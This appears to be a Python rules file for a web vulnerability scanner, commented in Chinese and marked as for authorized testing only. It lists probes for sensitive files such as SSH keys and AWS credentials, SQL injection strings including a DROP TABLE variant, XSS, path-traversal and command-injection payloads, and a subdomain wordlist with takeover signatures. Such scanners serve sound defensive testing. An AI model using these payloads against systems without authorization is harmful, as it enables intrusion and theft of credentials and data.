# -*- coding: utf-8 -*-
"""
漏洞规则库
包含规则扫描模式与全量扫描模式所用的全部预设规则与 Payload。
仅用于授权的安全测试与教学用途，禁止用于未授权扫描。
"""

# ============================================================
# 1. 敏感文件 / 目录泄露检测规则
#    value 为相对路径，扫描器会拼接在目标 URL 后进行探测
# ============================================================
SENSITIVE_PATHS = [
    "/robots.txt",
    "/sitemap.xml",
    "/.git/config",
    "/.git/HEAD",
    "/.svn/entries",
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.DS_Store",
    "/wp-admin/",
    "/wp-login.php",
    "/wp-config.php.bak",
    "/phpinfo.php",
    "/info.php",
    "/test.php",
    "/admin/",
    "/administrator/",
    "/admin.php",
    "/login.php",
    "/manager/",
    "/backup/",
    "/backup.zip",
    "/backup.tar.gz",
    "/backup.sql",
    "/db.sql",
    "/database.sql",
    "/dump.sql",
    "/config.php",
    "/config.php.bak",
    "/configuration.php",
    "/settings.php",
    "/.htaccess",
    "/.htpasswd",
    "/web.config",
    "/server-status",
    "/server-info",
    "/.well-known/security.txt",
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
    "/swagger-ui/",
    "/swagger.json",
    "/api-docs",
    "/graphql",
    "/.idea/",
    "/.idea/workspace.xml",
    "/.vscode/",
    "/composer.json",
    "/package.json",
    "/yarn.lock",
    "/.babelrc",
    "/.eslintrc",
    "/Dockerfile",
    "/docker-compose.yml",
    "/.dockerenv",
    "/proc/self/environ",
    "/etc/passwd",
    "/var/log/",
    "/access.log",
    "/error.log",
    "/debug.log",
    "/.aws/credentials",
    "/.ssh/id_rsa",
    "/.ssh/known_hosts",
    "/id_rsa",
    "/private.key",
    "/cert.pem",
]

# ============================================================
# 2. SQL 注入测试 Payload
#    扫描器会附加在参数值后，通过响应特征判断是否存在注入
# ============================================================
SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1",
    "' OR 1=1#",
    "1' OR '1'='1' -- -",
    "admin'--",
    "1; DROP TABLE--",
    "1 UNION SELECT NULL--",
    "' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
]

# SQL 注入命中特征（响应文本或行为）
SQLI_SIGNATURES = [
    "sql syntax",
    "mysql_fetch",
    "ORA-01756",
    "ORA-00936",
    "Microsoft SQL Native Client error",
    "ODBC SQL Server Driver",
    "SQLServer JDBC Driver",
    "PostgreSQL query failed",
    "Warning: mysql_",
    "Warning: pg_",
    "You have an error in your SQL syntax",
    "Unclosed quotation mark",
    "quoted string not properly terminated",
    "supplied argument is not a valid MySQL",
]

# ============================================================
# 3. XSS 跨站脚本测试 Payload
# ============================================================
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "'-alert(1)-'",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
]

# ============================================================
# 4. 目录穿越 Payload
# ============================================================
TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "C:\\windows\\win.ini",
    "..%252f..%252f..%252fetc%252fpasswd",
]

TRAVERSAL_SIGNATURES = [
    "root:x:0:0:",
    "[extensions]",
    "[fonts]",
    "for 16-bit app support",
    "boot loader",
]

# ============================================================
# 5. 命令注入 Payload
# ============================================================
CMDI_PAYLOADS = [
    ";id",
    "|id",
    "`id`",
    "$(id)",
    "&id",
    "&&id",
    ";uname -a",
    "|uname -a",
    ";ping -c 3 127.0.0.1",
    "|ping -n 3 127.0.0.1",
]

CMDI_SIGNATURES = [
    "uid=",
    "gid=",
    "groups=",
    "Linux",
    "Darwin",
    "windows",
    "Microsoft",
]

# ============================================================
# 6. 安全响应头检测规则
#    缺失则提示风险
# ============================================================
SECURITY_HEADERS = [
    "Strict-Transport-Security",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Content-Security-Policy",
    "X-XSS-Protection",
    "Referrer-Policy",
    "Permissions-Policy",
]

# ============================================================
# 7. 开放重定向 Payload
# ============================================================
OPEN_REDIRECT_PAYLOADS = [
    "https://www.example.com",
    "//www.example.com",
    "/\\www.example.com",
    "https:www.example.com",
    "//google.com",
]

# ============================================================
# 8. 子域名爆破字典（全量扫描模式使用）
# ============================================================
SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk",
    "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test",
    "ns", "blog", "pop3", "dev", "www2", "admin", "forum", "news", "vpn", "ns3",
    "mail2", "new", "mysql", "old", "lists", "support", "mobile", "mx", "static",
    "docs", "api", "staging", "demo", "app", "cdn", "cloud", "internal", "intranet",
    "portal", "secure", "shop", "store", "wiki", "git", "svn", "jenkins", "ci",
    "test1", "test2", "qa", "sandbox", "backup", "db", "database", "redis",
    "elastic", "search", "log", "logs", "monitor", "grafana", "prometheus",
    "kibana", "jira", "confluence", "rocket", "chat", "office", "oa", "hr",
    "crm", "erp", "bi", "dashboard", "panel", "console", "control", "manage",
    "service", "services", "ws", "websocket", "stream", "media", "img",
    "images", "static1", "static2", "assets", "files", "download", "upload",
    "uploads", "data", "cache", "proxy", "gateway", "auth", "sso", "oauth",
    "id", "identity", "account", "accounts", "user", "users", "profile",
    "m1", "m2", "m3", "mobi", "wap", "h5", "mini", "app1", "app2", "beta",
    "alpha", "rc", "release", "prod", "production", "stage", "staging2",
    "uat", "pre", "preview", "preview2", "test3", "demo1", "demo2", "demo3",
]

# ============================================================
# 9. 规则扫描模式（预设轨迹）- 按优先级排序的检测规则集
#    规则扫描仅执行以下子集，速度快、覆盖常见高危项
# ============================================================
RULE_SCAN_CHECKS = [
    "sensitive_files",     # 敏感文件泄露
    "security_headers",    # 安全响应头
    "sql_injection",       # SQL 注入（基础 Payload）
    "xss",                 # XSS
    "directory_traversal", # 目录穿越
    "open_redirect",       # 开放重定向
]

# ============================================================
# 10. 全量扫描模式 - 包含全部检测项 + 子域名枚举
# ============================================================
FULL_SCAN_CHECKS = [
    "sensitive_files",
    "security_headers",
    "sql_injection",
    "xss",
    "directory_traversal",
    "command_injection",
    "open_redirect",
    "subdomain_enum",      # 子域名枚举（仅全量模式）
    "subdomain_takeover",  # 子域名接管检测
    "ssl_info",            # SSL/TLS 信息
    "server_info",         # 服务器信息泄露
]

# 子域名接管检测特征指纹
SUBDOMAIN_TAKEOVER_SIGNATURES = {
    "github": ["There isn't a GitHub Pages site here"],
    "heroku": ["No such app", "herokucdn.com/error-pages/no-such-app.html"],
    "aws": ["The specified bucket does not exist", "NoSuchBucket"],
    "shopify": ["Sorry, this shop is currently unavailable"],
    "tumblr": ["Whatever you were looking for doesn't currently exist at this address"],
    "bitbucket": ["Repository has been removed"],
    "fastly": ["Fastly error: unknown domain"],
    "ghost": ["The thing you were looking for is no longer here"],
    "pantheon": ["The gods are wise, but do not know of the site which you seek"],
    "tilda": ["Please renew your subscription"],
    "unbounce": ["The requested URL was not found on this server"],
    "webflow": ["The page you are looking for doesn't exist or has been moved"],
    "wordpress": ["Do you want to register"],
}


def get_payloads(check_name):
    """根据检测项名称返回对应的 Payload 列表"""
    mapping = {
        "sql_injection": SQLI_PAYLOADS,
        "xss": XSS_PAYLOADS,
        "directory_traversal": TRAVERSAL_PAYLOADS,
        "command_injection": CMDI_PAYLOADS,
        "open_redirect": OPEN_REDIRECT_PAYLOADS,
    }
    return mapping.get(check_name, [])


def get_signatures(check_name):
    """根据检测项名称返回命中特征列表"""
    mapping = {
        "sql_injection": SQLI_SIGNATURES,
        "directory_traversal": TRAVERSAL_SIGNATURES,
        "command_injection": CMDI_SIGNATURES,
    }
    return mapping.get(check_name, [])
